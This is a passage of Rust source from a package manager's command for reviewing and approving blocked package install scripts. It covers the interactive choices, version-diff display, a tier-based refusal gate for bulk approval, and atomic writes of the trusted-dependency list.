        // `provenance_at_approval` and disarming drift checks.
        // Warn-mode preservation: when the snapshot is `None` but a
        // prior verified snapshot exists for the exact same version,
        // preserve it rather than overwriting with `None` —
        // otherwise a re-approval under Warn would silently clear
        // the prior reference and disarm drift detection.
        let snap = snapshot_for_binding(
            &provenance_by_pkg,
            &blocked.name,
            &blocked.version,
            runtime_enforce,
        )?;
        let meta = approval_metadata_preserving_existing_provenance(
            &trusted,
            blocked,
            capability_hash.clone(),
            snap,
        );
        trusted.approve_with_metadata(&blocked.name, &blocked.version, meta);
    }
    // close-out under `--dry-run`, skip the atomic
    // write; `approved` / `skipped` still fed into `print_summary`
    // so the agent sees the would-approve count.
    if !approved.is_empty() && !dry_run {
        crate::security_approval::ensure_project_trust_candidate_authorized(
            project_dir,
            &trusted,
            json_output,
            crate::security_approval::ApprovalSource::CliFlag,
        )?;
        write_back(&pkg_json_path, &mut manifest, &trusted)?;
    }

    print_summary(
        &effective_state,
        &approved,
        &skipped,
        &trusted,
        initial_was_legacy,
        false,
        dry_run,
        json_output,
        Some(&provenance_by_pkg),
    );
    Ok(())
}

/// The interactive walk's per-package
/// choice space.
///
/// `Approve` and `Skip` are the original actions used when
/// no prior approval exists for a different version of the same
/// package. adds [`AcceptNew`] and [`KeepOld`] — the same two
/// actions wearing labels that name the *update* the user is
/// reviewing, used when [`TrustedDependencies::latest_binding_for_name`]
/// returns a prior binding. Both pairs collapse to the same
/// approve / decline back-end semantics; the only difference is
/// the label clarity. `KeepOld` does **NOT** rewrite the resolver
/// pin or downgrade the package — per signoff B(i), it just means
/// "do not approve this candidate; the prior binding for the older
/// version stays untouched in `package.json`."
///
/// View / Quit are unconditional.
///
/// [`TrustedDependencies::latest_binding_for_name`]: lpm_workspace::TrustedDependencies::latest_binding_for_name
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum InteractiveChoice {
    /// First-time review: write a binding for `name@version`.
    Approve,
    /// First-time review: defer; nothing written.
    Skip,
    /// Update review: same as `Approve` but the label names the
    /// candidate ("accept the new version's binding"). Selected
    /// when a prior binding exists.
    AcceptNew,
    /// Update review: same as `Skip` but the label names the
    /// implicit retention ("keep the prior approval; don't trust
    /// this candidate"). Selected when a prior binding exists.
    KeepOld,
    /// Re-print the full install-phase scripts and re-prompt.
    View,
    /// Abort the walk without writing anything.
    Quit,
}

impl InteractiveChoice {
    /// Decision projection: collapse the four
    /// approve/decline-shaped variants onto the back-end action.
    /// `Some(true)` → write binding; `Some(false)` → decline (no
    /// write); `None` → not a decision (View / Quit).
    fn decision(self) -> Option<bool> {
        match self {
            InteractiveChoice::Approve | InteractiveChoice::AcceptNew => Some(true),
            InteractiveChoice::Skip | InteractiveChoice::KeepOld => Some(false),
            InteractiveChoice::View | InteractiveChoice::Quit => None,
        }
    }
}

/// Print the version-diff card for a
/// blocked entry — the fuller "changes since v<prior>" view that
/// renders alongside the package's existing card during the
/// interactive walk, the direct `<pkg>` approve, and the `--list`
/// listing.
///
/// No-op when (a) no prior approved binding exists for this
/// package name (first-time review — nothing to diff against), or
/// (b) the diff classifies as
/// [`crate::version_diff::VersionDiffReason::NoChange`].
///
/// Reads store bodies for both prior and candidate via
/// [`crate::build_state::read_install_phase_bodies`]; degrades
/// gracefully when the prior version is no longer in the store
/// (cache cleaned, fresh clone evicted the prior tarball) — the
/// renderer prints its "(prior or candidate scripts not in store)"
/// fallback rather than emitting a misleading empty diff.
///
/// Emits to stdout (cliclack TUI is stdout-driven; `--json` mode
/// can never reach this path because the interactive walk refuses
/// to combine with `--json` upstream).
fn print_version_diff_card_for_blocked(blocked: &BlockedPackage, trusted: &TrustedDependencies) {
    let Some((prior_version, binding)) =
        trusted.latest_binding_for_name(&blocked.name, &blocked.version)
    else {
        return;
    };
    let diff = crate::version_diff::compute_version_diff(prior_version, binding, blocked);
    if !diff.is_drift() {
        return;
    }
    // confidence-followup S5a — v2-aware lookup. Pre-fix, the
    // PackageStore::package_dir paths below were v1-only — under the
    // v2-default install pipeline, both `prior` and `candidate`
    // resolved to non-existent paths, so `read_install_phase_bodies`
    // returned empty vecs and the version-diff card silently degraded
    // to the "scripts not in store" fallback for every v2 install.
    let lpm_root = match lpm_common::LpmRoot::from_env() {
        Ok(r) => r,
        Err(_) => {
            if let Some(card) =
                crate::version_diff::render_preflight_card(&diff, &blocked.name, None, None)
            {
                println!();
                println!("{card}");
                println!();
            }
            return;
        }
    };
    let store_dir_for = |version: &str| -> Option<std::path::PathBuf> {
        lpm_store::find_installed_package_baseline(&lpm_root, &blocked.name, version)
            .ok()
            .flatten()
            .map(|b| b.package_dir)
    };
    let prior_pairs = match store_dir_for(prior_version) {
        Some(dir) => crate::build_state::read_install_phase_bodies(&dir),
        None => Vec::new(),
    };
    let candidate_pairs = match store_dir_for(&blocked.version) {
        Some(dir) => crate::build_state::read_install_phase_bodies(&dir),
        None => Vec::new(),
    };
    let prior_bodies = if prior_pairs.is_empty() {
        None
    } else {
        Some(crate::version_diff::phase_bodies_from_pairs(prior_pairs))
    };
    let candidate_bodies = if candidate_pairs.is_empty() {
        None
    } else {
        Some(crate::version_diff::phase_bodies_from_pairs(
            candidate_pairs,
        ))
    };
    if let Some(card) = crate::version_diff::render_preflight_card(
        &diff,
        &blocked.name,
        prior_bodies.as_ref(),
        candidate_bodies.as_ref(),
    ) {
        println!();
        println!("{card}");
        println!();
    }
}

/// Find a blocked package matching either `name` or `name@version`.
/// Used by the `<pkg>` argument path.
fn find_blocked_by_arg<'a>(blocked: &'a [BlockedPackage], arg: &str) -> Option<&'a BlockedPackage> {
    // Case 1: name@version (exact match)
    // Case 2: bare name (returns the FIRST entry with that name)
    //
    // For scoped packages like `@scope/pkg@1.0.0`, the LAST `@` is the
    // separator (the leading `@` is part of the scope).
    if let Some(at) = arg.rfind('@') {
        // arg COULD be `name@version` OR a scoped name `@scope/pkg`.
        // Distinguish: if the `@` is at position 0, it's the scope marker.
        if at > 0 {
            let (name, version) = (&arg[..at], &arg[at + 1..]);
            return blocked
                .iter()
                .find(|b| b.name == name && b.version == version);
        }
    }
    // Bare name lookup
    blocked.iter().find(|b| b.name == arg)
}

/// Extract `lpm.trustedDependencies` from a parsed manifest into a typed
/// [`TrustedDependencies`] enum. Returns the default (empty Legacy) if the
/// field is missing or fails to parse.
fn extract_trusted_dependencies(manifest: &serde_json::Value) -> TrustedDependencies {
    let Some(td_value) = manifest
        .get("lpm")
        .and_then(|l| l.get("trustedDependencies"))
    else {
        return TrustedDependencies::default();
    };
    serde_json::from_value(td_value.clone()).unwrap_or_default()
}

/// Write the updated `trustedDependencies` back to `package.json`.
///
/// Atomic via temp-file rename. Preserves the rest of the manifest
/// untouched (we mutate only the `lpm.trustedDependencies` subtree).
fn write_back(
    pkg_json_path: &Path,
    manifest: &mut serde_json::Value,
    trusted: &TrustedDependencies,
) -> Result<(), LpmError> {
    // Ensure `lpm` exists as a JSON object
    if manifest.get("lpm").is_none() {
        manifest["lpm"] = serde_json::json!({});
    }
    if !manifest["lpm"].is_object() {
        return Err(LpmError::Registry(
            "package.json `lpm` field is not a JSON object — refusing to write".into(),
        ));
    }

    let td_value = serde_json::to_value(trusted)
        .map_err(|e| LpmError::Registry(format!("failed to serialize trustedDependencies: {e}")))?;
    manifest["lpm"]["trustedDependencies"] = td_value;

    let updated = serde_json::to_string_pretty(manifest)
        .map_err(|e| LpmError::Registry(format!("failed to serialize package.json: {e}")))?;

    // Atomic write: temp file + rename. Mirrors build_state::write_build_state.
    let parent = pkg_json_path.parent().unwrap_or(Path::new("."));
    let pid = std::process::id();
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let tmp = parent.join(format!(".package.json.{pid}.{nanos}.tmp"));
    std::fs::write(&tmp, format!("{updated}\n")).map_err(LpmError::Io)?;
    std::fs::rename(&tmp, pkg_json_path).map_err(|e| {
        let _ = std::fs::remove_file(&tmp);
        LpmError::Io(std::io::Error::new(
            e.kind(),
            format!("failed to rename package.json tempfile into place: {e}"),
        ))
    })?;

    Ok(())
}

fn is_tty() -> bool {
    use std::io::IsTerminal;
    std::io::stdin().is_terminal() && std::io::stdout().is_terminal()
}

fn emit_yes_warning_banner(count: usize, json_output: bool) {
    let msg = format!(
        "--yes blanket-approves {count} package(s) without per-package review. \
         Approvals are bound to script hashes captured at install time. \
         This bypasses LPM's default-deny security posture."
    );
    // Triple-emission per status doc §"Security requirements":
    // human stdout (only in non-JSON mode), JSON warning field (set by
    // print_summary), and tracing log so any log aggregator catches the
    // bypass.
    //
    // the tracing emission
    // is safe in JSON mode because the global tracing subscriber in
    // `main.rs` is pinned to stderr — see the matching audit comment
    // there. Pre-fix the subscriber wrote to stdout and corrupted the
    // JSON payload. The relevant invariant: stdout is reserved for
    // command output (human or JSON); tracing always goes to stderr.
    tracing::warn!("{}", msg);
    if !json_output {
        println!();
        output::warn(&msg);
        println!();
    }
}

fn print_package_card(blocked: &BlockedPackage) {
    println!();
    println!("  {}@{}", blocked.name.bold(), blocked.version.dimmed(),);
    if let Some(integrity) = &blocked.integrity {
        println!(
            "    {:<14}{}",
            "Integrity:".dimmed(),
            truncate_for_display(integrity, 60),
        );
    }
    if let Some(script_hash) = &blocked.script_hash {
        println!(
            "    {:<14}{}",
            "Script hash:".dimmed(),
            truncate_for_display(script_hash, 60),
        );
    }
    if !blocked.phases_present.is_empty() {
        println!(
            "    {:<14}{}",
            "Phases:".dimmed(),
            blocked.phases_present.join(", "),
        );
    }
    // — static-gate tier annotation for the
    // interactive card. Absent (None) means the blocked-state row
    // predates; don't print a line rather than showing a
    // misleading "unknown".
    if let Some(tier) = blocked.static_tier {
        println!(
            "    {:<14}{}",
            "Static tier:".dimmed(),
            colored_tier_label(tier),
        );
    }
    if blocked.binding_drift {
        println!(
            "    {} {}",
            "⚠".yellow(),
            "previously approved — script content has changed since approval".yellow()
        );
    }
    println!();
}

/// Distinguishes the project and global gate call sites so the refusal
/// error's redirect prose names the correct flag set. The substring
/// `--yes refuses` is identical across scopes (agents already
/// substring-match on it); only the trailing `Run ...` redirect varies.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum GateScope {
    Project,
    Global,
}

/// Common shape consumed by [`enforce_tiered_yes_gate`]. Implemented by
/// both [`BlockedPackage`] (project blocked set) and
/// [`crate::global_blocked_set::AggregateBlockedRow`] (global aggregate
/// row) so a single gate function enforces the policy at every bulk-
/// approval call site. Without this trait, the global bulk paths
/// historically wrote approvals straight to the trust file without any
/// tier check — the M75 finding.
trait TieredRow {
    /// `name@version` for the refusal error's per-row listing.
    fn display_id(&self) -> String;
    /// `Some(tier)` when classification ran, `None` for legacy /
    /// pre-classification state (passes through; see the call-site
    /// comments for the rationale).
    fn static_tier(&self) -> Option<lpm_security::triage::StaticTier>;
}

impl TieredRow for BlockedPackage {
    fn display_id(&self) -> String {
        format!("{}@{}", self.name, self.version)
    }
    fn static_tier(&self) -> Option<lpm_security::triage::StaticTier> {
        self.static_tier
    }
}

impl TieredRow for crate::global_blocked_set::AggregateBlockedRow {
    fn display_id(&self) -> String {
        format!("{}@{}", self.name, self.version)
    }
    fn static_tier(&self) -> Option<lpm_security::triage::StaticTier> {
        self.static_tier
    }
}

/// Blanket impl so the gate accepts both `&[Row]` and `&[&Row]`. The
/// grouped-interactive path operates on `Vec<&AggregateBlockedRow>`
/// (slicing the aggregate without cloning); without this impl the gate
/// callsite would need to either clone or own the rows.
impl<T: TieredRow + ?Sized> TieredRow for &T {
    fn display_id(&self) -> String {
        (**self).display_id()
    }
    fn static_tier(&self) -> Option<lpm_security::triage::StaticTier> {
        (**self).static_tier()
    }
}

/// — enforce the `--yes` refusal contract.
///
/// Given the **effective** blocked-set that `--yes` would approve,
/// return `Err` if any entry carries an explicit non-green static
/// tier (`Amber`, `AmberLlm`, `Red`). `Green` and `None` pass through;
/// see the gate-site comment at the callsite for the `None`-means-
/// pre-P2-state pass-through rationale.
///
/// Pure so it's unit-testable without an end-to-end `run()`
/// invocation. The callsite threads the returned `LpmError` up and
/// the JSON-error wrapper in `main.rs` turns it into structured
/// output when `--json` is set.
///
/// Generic over [`TieredRow`] so the same gate enforces the policy on
/// both the project blocked set ([`BlockedPackage`]) and the global
/// aggregate ([`AggregateBlockedRow`]). [`GateScope`] selects the
/// per-flag redirect prose; the load-bearing `--yes refuses` prefix is
/// shared across scopes for agent substring matching.
fn enforce_tiered_yes_gate<R: TieredRow>(blocked: &[R], scope: GateScope) -> Result<(), LpmError> {
    use lpm_security::triage::StaticTier;

    let refusals: Vec<&R> = blocked
        .iter()
        .filter(|bp| {
            matches!(
                bp.static_tier(),
                Some(StaticTier::Amber | StaticTier::AmberLlm | StaticTier::Red)
            )
        })
        .collect();

    if refusals.is_empty() {
        return Ok(());
    }

    // Actionable error shape: count → per-package lines with tier
    // label → clear redirect to the interactive / single-pkg path.
    // Agents parsing the error_code=script error can substring-match
    // the `"--yes refuses"` prefix, which is stable-onward.
    let detail = refusals
        .iter()
        .map(|bp| {
            let tier_text = bp.static_tier().map_or("unknown tier", tier_label_text);
            format!("    {}  [{}]", bp.display_id(), tier_text)
        })
        .collect::<Vec<_>>()
        .join("\n");

    let redirect = match scope {
        GateScope::Project => {
            "Run `lpm approve-scripts` (interactive walk) or \
             `lpm approve-scripts <pkg>` to review individual packages. \
             Use `lpm approve-scripts --list` to inspect the full blocked set first."
        }
        GateScope::Global => {
            "Run `lpm approve-scripts --global` (interactive walk) or \
             `lpm approve-scripts --global <pkg>` to review individual packages. \
             Use `lpm approve-scripts --global --list` to inspect the full blocked set first."
        }
    };

    Err(LpmError::Script(format!(
        "--yes refuses to bulk-approve {} package(s) classified outside the \
         green tier. Each requires explicit per-package review.\n\n{}\n\n{}",
        refusals.len(),
        detail,
        redirect,
    )))
}

/// Plain text label for a [`StaticTier`] value — consumed by
/// [`colored_tier_label`] and by tests that don't want to assert
/// on ANSI escape sequences.
fn tier_label_text(tier: lpm_security::triage::StaticTier) -> &'static str {
    use lpm_security::triage::StaticTier;
    match tier {
        StaticTier::Green => "green ✓",
        StaticTier::Amber => "amber — review required",
        StaticTier::AmberLlm => "amber (llm-advised) — review required",
        StaticTier::Red => "red ✖ — hand-curated blocklist hit",
    }
}

/// Colored rendering of the tier label. Green → green, Red → red,
/// the ambers → yellow. Kept thin so the color policy lives in one
/// place and the plain-text helper stays unit-testable.
fn colored_tier_label(tier: lpm_security::triage::StaticTier) -> String {
    use lpm_security::triage::StaticTier;
    let text = tier_label_text(tier);
    match tier {
        StaticTier::Green => text.green(),
        StaticTier::Amber | StaticTier::AmberLlm => text.yellow(),
        StaticTier::Red => text.red(),
    }
}

fn truncate_for_display(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        format!("{}…", &s[..max])
    }
}

/// Read the package's `package.json` from the GLOBAL STORE and print every
/// non-empty install phase body. Used by the "View full script" choice in
/// the interactive walk. Read from the store (not from `node_modules`) to
/// match what the build pipeline executes — same source-of-truth as the
/// script-hash function.
fn print_full_script(_project_dir: &Path, blocked: &BlockedPackage) {
    // confidence-followup S5a — `find_installed_package_baseline`
    // (v2-first, v1-fallback) replaces the v1-only `PackageStore::package_dir`
    // call. Pre-fix, "View full script" emitted "could not read
    // package.json from store" for every v2-installed package because
    // the v1 path didn't exist.
    let lpm_root = match lpm_common::LpmRoot::from_env() {
        Ok(r) => r,
        Err(e) => {
            output::warn(&format!("could not resolve lpm root: {e}"));
            return;
        }
    };
    let pkg_dir = match lpm_store::find_installed_package_baseline(
        &lpm_root,
        &blocked.name,
        &blocked.version,
    ) {
        Ok(Some(b)) => b.package_dir,
        Ok(None) => {
            output::warn(&format!(
                "{}@{}: not found in store (workspace/file/link source, or corrupt install)",
                blocked.name, blocked.version
            ));
            return;
        }
        Err(e) => {
            output::warn(&format!("could not query store: {e}"));
            return;
        }
    };
    let pkg_json_path = pkg_dir.join("package.json");
    let content = match std::fs::read_to_string(&pkg_json_path) {
        Ok(c) => c,
        Err(e) => {
            output::warn(&format!(
                "could not read package.json from store at {}: {e}",
                pkg_json_path.display()
            ));
            return;
        }
    };
    let parsed: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(e) => {
            output::warn(&format!("could not parse package.json: {e}"));
            return;
        }
    };
    let scripts = parsed.get("scripts").and_then(|v| v.as_object());

    println!();
    println!("  ── Full install scripts ──");
    for phase in lpm_security::EXECUTED_INSTALL_PHASES {
        let body = scripts
            .and_then(|s| s.get(*phase))
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty());
        match body {
            Some(b) => {
                println!("  {}: {}", phase.bold(), b);
            }
            None => {
                println!("  {}: {}", phase.dimmed(), "(none)".dimmed());
            }
        }
    }
    println!();
}

fn print_listing(
    state: &BuildState,
    trusted: &TrustedDependencies,
    // close-out list is structurally read-only
    // so dry-run is semantically a no-op here, but the envelope
    // still surfaces the flag for uniform agent parsing — agents
    // read `envelope.dry_run` without branching on mode.
    dry_run: bool,
    json_output: bool,
) {
    if json_output {
        let body = serde_json::json!({
            "schema_version": SCHEMA_VERSION,
            "command": "approve-scripts",
            "mode": "list",
            "dry_run": dry_run,
            "blocked_count": state.blocked_packages.len(),
            "approved_count": 0,
            "skipped_count": 0,
            "blocked": state.blocked_packages.iter().map(|b| blocked_to_json(b, trusted)).collect::<Vec<_>>(),
            "warnings": [],
            "errors": [],
        });
        println!("{}", serde_json::to_string_pretty(&body).unwrap());
        return;
    }

    output::info(&format!(
        "{} package(s) blocked:",
        state.blocked_packages.len()
    ));
    for blocked in &state.blocked_packages {
        print_package_card(blocked);
        // surface the version diff card
        // alongside each entry's regular card. No-op for entries
        // without a prior binding under the same name (first-time
        // review — nothing to diff against).
        print_version_diff_card_for_blocked(blocked, trusted);
    }
    println!();
    output::info(
        "Run `lpm approve-scripts` (interactive), `lpm approve-scripts --yes` (bulk), or `lpm approve-scripts <pkg>` to approve.",
    );
}

/// Delegates to the shared
/// canonical helper [`crate::version_diff::blocked_to_json`] so the
/// approve-scripts JSON paths and the install-pipeline JSON paths
/// emit byte-identical entry shapes. Pre-Chunk-4 this was an inline
/// `serde_json::json!` literal; consolidating prevents key drift
/// between the two callers as future fields land.
fn blocked_to_json(blocked: &BlockedPackage, trusted: &TrustedDependencies) -> serde_json::Value {
    crate::version_diff::blocked_to_json(blocked, trusted)
}

// clippy::too_many_arguments: print_summary has grown with each
// phase (P6 tier annotations, version diff, close-out
// dry-run). A wrapper struct would hurt readability more
// than the arg count — every caller inside `run` constructs the
// same set of fields inline, and there's no reuse across commands.
// Fold into a struct only if a second command-level surface starts
// consuming the same shape.
#[allow(clippy::too_many_arguments)]
fn print_summary(
    state: &BuildState,
    approved: &[&BlockedPackage],
    skipped: &[&BlockedPackage],
    trusted: &TrustedDependencies,
    initial_was_legacy: bool,
    yes_flag: bool,
    // close-out when true, JSON envelope carries
    // `"dry_run": true` so agents can distinguish preview from live
    // runs at parse time; human output reframes "X approved" as
    // "would approve X — no changes written" and drops the
    // `lpm rebuild` next-step pointer (since there are no new
    // approvals to run).
    dry_run: bool,
    json_output: bool,
    // Live `ProvenanceStatus` map from the batch fetch,
    // threaded through so each blocked entry's JSON envelope can
    // surface `provenance.verified` per package. `None` for callers
    // that have no map in scope (the read-only `--list` path bypasses
    // it entirely; the per-package named approval path uses the
    // single-entry helper directly). When `Some(_)`, the map's keys
    // are the same `(name, version)` pairs as the blocked set.
    provenance_by_pkg: Option<&HashMap<(String, String), ProvenanceStatus>>,
) {
    if json_output {
        let mut warnings: Vec<serde_json::Value> = Vec::new();
        if yes_flag {
            let msg = if dry_run {
                format!(
                    "DRY RUN — would blanket-approve {} package(s) via --yes; no write performed",
                    approved.len()
                )
            } else {
                format!(
                    "--yes blanket-approved {} package(s) without per-package review",
                    approved.len()
                )
            };
            warnings.push(serde_json::json!({
                "code": "yes_blanket_approve",
                "message": msg,
            }));
        }
        if initial_was_legacy && !approved.is_empty() && !dry_run {
            // Suppress the legacy-upgrade warning under dry-run: no
            // write happened, so the legacy array form is still on
            // disk. Surfacing it as "upgraded" would be misleading.
            warnings.push(serde_json::json!({
                "code": "legacy_upgraded_to_rich",
                "message": "trustedDependencies was upgraded from the legacy array form to the rich map form"
            }));
        }
        let body = serde_json::json!({
            "schema_version": SCHEMA_VERSION,
            "command": "approve-scripts",
            "mode": if yes_flag { "yes" } else { "interactive" },
            "dry_run": dry_run,
            "blocked_count": state.blocked_packages.len(),
            "approved_count": approved.len(),
            "skipped_count": skipped.len(),
            // per-entry `version_diff` flows
            // through `blocked_to_json`. Note: when this fires
            // post-write-back (the --yes and interactive paths),
            // `trusted` includes the just-written binding for
            // `name@candidate_version`. The diff selector is
            // strictly-less-than the candidate, so it skips the
            // freshly-added entry and still reports the diff
            // against the prior version — matches what the user
            // saw when reviewing. Under `--dry-run`, no write
            // happened, so `trusted` retains the pre-run state
            // and the diff reports against the prior binding
            // identically.
            // When the live ProvenanceStatus map is in scope, each
            // entry's JSON envelope gains a `provenance` block
            // (`verified: true | "skipped" | false | null |
            // "verification_rejected"`). Additive — older agents
            // that don't expect the key remain readable.
            "approved": approved.iter().map(|b| crate::version_diff::blocked_to_json_with_provenance(b, trusted, provenance_by_pkg)).collect::<Vec<_>>(),
            "skipped": skipped.iter().map(|b| crate::version_diff::blocked_to_json_with_provenance(b, trusted, provenance_by_pkg)).collect::<Vec<_>>(),
            "warnings": warnings,
            "errors": [],
        });
        println!("{}", serde_json::to_string_pretty(&body).unwrap());
    } else {
        println!();
        if approved.is_empty() && skipped.is_empty() {
            output::info("No changes to package.json.");
        } else if dry_run {
            output::info(&format!(
                "DRY RUN — would approve {}, skip {}. No changes written.",
                approved.len(),
                skipped.len(),
            ));
        } else {
            output::success(&format!(
                "{} approved, {} skipped.",
                approved.len(),
                skipped.len()
            ));
            if !approved.is_empty() {
                output::info("Run `lpm rebuild` to execute the approved scripts.");
            }
            if initial_was_legacy {
                output::info(
                    "trustedDependencies upgraded from legacy array to rich form (binding metadata).",
                );
            }
        }
    }
}

#[allow(dead_code)]
fn _build_state_path_for_tests(project_dir: &Path) -> PathBuf {
    build_state::build_state_path(project_dir)
}

// ─── approve-scripts --global ────────────────────────────

/// Threshold at which `--group` auto-enables for `--global` review.
/// Reviewing N-at-once packages one-by-one past this size is typically
/// impractical; the grouped UI shows the same info indexed by
/// top-level globally-installed package instead of per-dep.
pub const GROUP_AUTO_THRESHOLD: usize = 10;

/// Global-scope approve-scripts entry point. Mirrors [`run`] but sources
/// the blocked set from [`crate::global_blocked_set`] and persists
/// approvals to `~/.lpm/global/trusted-dependencies.json` instead of
/// the project's `package.json`.
///
/// Mode matrix (identical shape to `run`):
///
///   list=true                → read-only print; no mutations
///   yes=true                 → bulk approve every remaining row
///   package=Some(pkg)        → approve one row by name/`name@version`
///   otherwise, is_tty()      → interactive walk (cliclack)
///   otherwise, not is_tty()  → hard error; recommend --list or --yes
///
/// `group` groups both read-only list output and the interactive global
/// review by top-level globally-installed package. Persisted approvals
/// still remain per dependency binding row. Grouped output auto-enables
/// when the effective set exceeds [`GROUP_AUTO_THRESHOLD`] and the caller
/// didn't explicitly set it.
pub async fn run_global(
    package: Option<&str>,
    yes: bool,
    list: bool,
    group: bool,
    dry_run: bool,
    json_output: bool,
) -> Result<(), LpmError> {
    let lock_path = lpm_common::LpmRoot::from_env()?.store_lock();
    lpm_common::with_shared_lock_async(
        lock_path,
        run_global_under_store_lock(package, yes, list, group, dry_run, json_output),
    )
    .await
}

async fn run_global_under_store_lock(
    package: Option<&str>,
    yes: bool,
    list: bool,
    group: bool,
    // close-out dry-run mirror of [`run`]'s flag,
    // for the global surface. When true, each mutating write into
    // `~/.lpm/global/trusted-dependencies.json` — across
    // [`run_global_bulk_yes`], [`run_global_named`], and the three
    // write sites inside [`run_global_interactive`] (per-row
    // approve, group approve-all, non-grouped per-row) — is
    // short-circuited, and the JSON envelopes carry
    // `"dry_run": true`. No-op when combined with `--list`.
    dry_run: bool,
    json_output: bool,
) -> Result<(), LpmError> {
    // Mirror `run()`'s argument validation.
    if yes && list {
        return Err(LpmError::Script(
            "`--list` is read-only and conflicts with `--yes`. \
             Pick one: `--list` to inspect, or `--yes` to approve."
                .into(),
        ));
    }
    if list && package.is_some() {
        return Err(LpmError::Script(
            "`--list` cannot take a package name argument. \
             It prints the entire blocked set in read-only mode."
                .into(),
        ));
    }
    if group && (yes || package.is_some()) {
        return Err(LpmError::Script(
            "`--group` only affects `lpm approve-scripts --global --list` and the \
             interactive global review. It does not apply to `--yes` or direct package approval."
                .into(),
        ));
    }

    let root = lpm_common::LpmRoot::from_env()?;
    let aggregate = crate::global_blocked_set::aggregate_blocked_across_globals(&root)?;
    let effective_group = group || aggregate.rows.len() > GROUP_AUTO_THRESHOLD;

    // ── List mode ─────────────────────────────────────────────────
    if list {
        print_global_list(&aggregate, effective_group, dry_run, json_output);
        return Ok(());
    }

    // ── Empty set short-circuit (same as project-scoped run) ────
    if aggregate.rows.is_empty() {
        if json_output {
            // close-out `dry_run` echoed for
            // schema-level uniformity — see the matching comment
            // on the project-side empty-set branch. No mutation
            // happens here regardless of the flag.
            let body = serde_json::json!({
                "schema_version": SCHEMA_VERSION,
                "command": "approve-scripts",
                "scope": "global",
                "dry_run": dry_run,
                "blocked_count": 0,
                "approved_count": 0,
                "skipped_count": 0,
                "blocked": [],
                "warnings": [],
                "errors": [],
                "unreadable_origins": aggregate.unreadable_origins,
            });
            println!("{}", serde_json::to_string_pretty(&body).unwrap());
        } else if !aggregate.unreadable_origins.is_empty() {
            output::warn(&format!(
                "{} globally-installed package(s) have missing or unreadable build-state \
                 files; the aggregate may be incomplete: {}",
                aggregate.unreadable_origins.len(),
                aggregate.unreadable_origins.join(", "),
            ));
        } else {
            output::success(
                "Nothing to approve. All globally-installed packages' scripts are covered.",
            );
        }
        return Ok(());
    }

    let (verify_policy, runtime_sigstore_source) = runtime_verify_policy_with_source();
    let runtime_enforce = verify_policy.enforce;
    if !dry_run {
        crate::security_approval::ensure_runtime_sigstore_posture_for_global(
            json_output,
            runtime_enforce,
            runtime_sigstore_source,
        )?;
    }

    // ── Named-package approval path ───────────────────────────────
    if let Some(arg) = package {
        return run_global_named(
            &root,
            &aggregate,
            arg,
            dry_run,
            json_output,
            &verify_policy,
            runtime_enforce,
        )
        .await;
    }

    // ── Bulk-approve mode ─────────────────────────────────────────
    if yes {
        return run_global_bulk_yes(
            &root,
            &aggregate,
            dry_run,
            json_output,
            &verify_policy,
            runtime_enforce,
        )
        .await;
    }

    // ── Interactive walk ──────────────────────────────────────────
    if !is_tty() || json_output {
        // No TTY (or JSON mode) + no flags: surface the deterministic
        // error naming --list / --yes so CI / agents know how to proceed.
        // `--dry-run` without --list / --yes / <pkg> hits this too:
        // an interactive preview still needs a TTY to render the
        // prompts, so the error stays the same.
        return Err(LpmError::Script(format!(
            "`lpm approve-scripts --global` needs a TTY for the interactive walk \
             ({} global package(s) with blocked scripts). Pass `--list` to inspect, \
             `--yes` to bulk-approve, or `<pkg>` to approve one.",
            aggregate.rows.len(),
        )));
    }
    run_global_interactive(
        &root,
        &aggregate,
        effective_group,
        dry_run,
        json_output,
        &verify_policy,
        runtime_enforce,
    )
    .await
}

/// `--list` implementation: print the aggregate read-only. `--group`
/// toggles the output shape (rows-by-dep vs by-top-level).
fn print_global_list(
    aggregate: &crate::global_blocked_set::AggregateBlockedSet,
    group: bool,
    // close-out see the project-side
    // [`print_listing`] comment — read-only path, flag surfaced for
    // schema uniformity.
    dry_run: bool,
    json_output: bool,
) {
    if json_output {
        let entries: Vec<_> = aggregate
            .rows
            .iter()
            .map(|r| {
                serde_json::json!({
                    "name": r.name,
                    "version": r.version,
                    "integrity": r.integrity,
                    "script_hash": r.script_hash,
                    "phases_present": r.phases_present,
                    "binding_drift": r.binding_drift,
                    "origins": r.origins,
                })
            })
            .collect();
        let body = serde_json::json!({
            "schema_version": SCHEMA_VERSION,
            "command": "approve-scripts",
            "scope": "global",
            "dry_run": dry_run,
            "group": group,
            "blocked_count": aggregate.rows.len(),
            "blocked": entries,
            "unreadable_origins": aggregate.unreadable_origins,
            "warnings": [],
            "errors": [],
        });
        println!("{}", serde_json::to_string_pretty(&body).unwrap());
        return;
    }
    if aggregate.rows.is_empty() {
        output::success("Nothing blocked globally.");
        return;
    }
    println!();
    output::info(&format!(
        "{} package{} blocked pending review:",
        aggregate.rows.len().to_string().bold(),
        if aggregate.rows.len() == 1 { "" } else { "s" },
    ));
    println!();
    if group {
        // Group by the first listed origin (globally-installed
        // package name). Rows with multiple origins appear once per
        // origin so the user sees which global install needs which
        // approvals.
        let mut by_origin: std::collections::BTreeMap<
            &str,
            Vec<&crate::global_blocked_set::AggregateBlockedRow>,
        > = std::collections::BTreeMap::new();
        for row in &aggregate.rows {
            for origin in &row.origins {
                by_origin.entry(origin.as_str()).or_default().push(row);
            }
        }
        for (origin, rows) in by_origin {
            println!(
                "  {} ({} blocked dep{}):",
                origin.bold(),
                rows.len(),
                if rows.len() == 1 { "" } else { "s" },
            );
            for r in rows {
                println!(
                    "    {} @ {}{}",
                    r.name,
                    r.version.dimmed(),
                    if r.binding_drift {
                        "  [binding drift]".yellow().to_string()
                    } else {
                        String::new()
                    }
                );
            }
            println!();
        }
    } else {
        for r in &aggregate.rows {
            println!(
                "  {} @ {} — used by {}{}",
                r.name.bold(),
                r.version.dimmed(),
                r.origins.join(", "),
                if r.binding_drift {
                    "  [binding drift]".yellow().to_string()
                } else {
                    String::new()
                }
            );
        }
    }
    if !aggregate.unreadable_origins.is_empty() {
        println!();
        output::warn(&format!(
            "Note: {} globally-installed package(s) have missing build-state files and were \
